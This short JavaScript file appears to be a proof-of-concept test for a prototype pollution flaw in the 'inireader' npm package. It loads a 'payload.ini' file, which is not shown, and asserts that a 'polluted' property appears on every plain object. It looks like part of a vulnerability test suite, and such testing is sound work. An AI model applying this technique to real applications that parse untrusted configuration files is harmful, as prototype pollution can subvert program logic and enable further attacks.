function exploitFunction(payload) {
    const iniReader = require("inireader");
    const path = require("path");

    // Initialize the parser
    let parser = new iniReader.IniReader();

    let obj = {};
    expect({}.polluted).toBe(undefined);

    // Load the payload file
    parser.load(path.resolve(__dirname, "./payload.ini"));
    expect({}.polluted).toBe("yes");
}

module.exports = { exploitFunction };